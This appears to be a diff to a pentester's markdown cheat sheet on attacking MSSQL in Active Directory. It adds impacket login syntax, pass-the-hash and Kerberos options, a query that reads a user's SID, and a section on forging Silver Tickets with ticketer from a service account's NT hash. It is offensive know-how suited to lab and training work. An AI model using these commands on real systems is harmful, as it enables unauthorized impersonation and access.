@@ -6,9 +6,13 @@ You can login into the service using mssqlclient.py from impacket suite:
 
 `mssqlclient.py <domain>/<user>:'<password>'@<ip>`
 
+KALI -> `impacket-mssqlclient <domain>/<user>:'<password>'@<ip>`
+
 Pass-the-hash: `mssqlclient.py <domain>/user:@<ip> -hashes '<optional LM hash>:<NT hash>'`
 
-Kerberos auth: `sudo rdate -n <ip> ; <domain>/<user>:'<password>'@<machine>.<domain> -k`
+Kerberos auth: `sudo rdate -n <ip> ; mssqlclient.py <domain>/<user>:@<machine>.<domain> -k -no-pass`
+
+Windows auth: If user you use is a windows user instead of SQL server user use flag -windows-auth
 
 <br>
 
@@ -68,6 +72,7 @@ SELECT SERVERPROPERTY('MachineName');  -- Hostname
 SELECT SERVERPROPERTY('Edition');      -- Edition (Express, Standard, etc.)
 SELECT SERVERPROPERTY('InstanceName'); -- Instance name
 SELECT SERVERPROPERTY('ProductLevel'); -- Patch level
+SELECT SUSER_SID('<domain>\<user>') AS SID_Usuario; -- User SID
 
 SELECT name,type_desc FROM sys.server_principals WHERE type='S'; -- Sql logins (server-level users and roles)
 SELECT name,type_desc FROM sys.server_principals WHERE type='R'; -- server roles
@@ -139,7 +144,46 @@ SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)>
 
 <br>
 
-Other interesting articles: https://one2bla.me/Breach-operations/attacking-mssql
+### SPN user -> Silver ticket
+
+If the user you compromise have an SPN associated you may create arbitrary kerberos tickets, for any user or group, for that specific service.
+
+Users associated to SPN use to be called like:
+
+```
+<domain>\<user with name related to service>
+DOMAIN.LOCAL\svc_sql
+MEGACORP.HTB\svc_mssql
+COMPANY.COM\sql_svc
+TESTLAB.local\svc_sql_prod
+SUPERDOMAIN.THM\svc_sql_inst01
+```
+
+SPN associated to that user might be like:
+
+```
+MSSQLSvc/server:port
+MSSQLSvc/server.domain:port
+```
+
+
+If an user is associacted to an SPN you my craft arbitrary kerberos tickets (only for that service) using ticketer. You may impersonate any user or group you want. Examples:
+
+`ticketer.py -nthash '<nt hash>' -domain-sid '<domain SID>' -domain '<domain>' -spn '<spn>' '<user or group to impersonate>'`
+
+Kali -> `impacket-ticketer -nthash '<nt hash>' -domain-sid '<domain SID>' -domain '<domain>' -spn '<spn>' '<user or group to impersonate>'`
+
+
+
+
+
+<br>
+
+Other interesting articles:
+
+https://one2bla.me/Breach-operations/attacking-mssql
+
+https://medium.com/@Tvrpism/how-does-the-silver-ticket-actually-work-368ec8905edd
 
 <br>
 
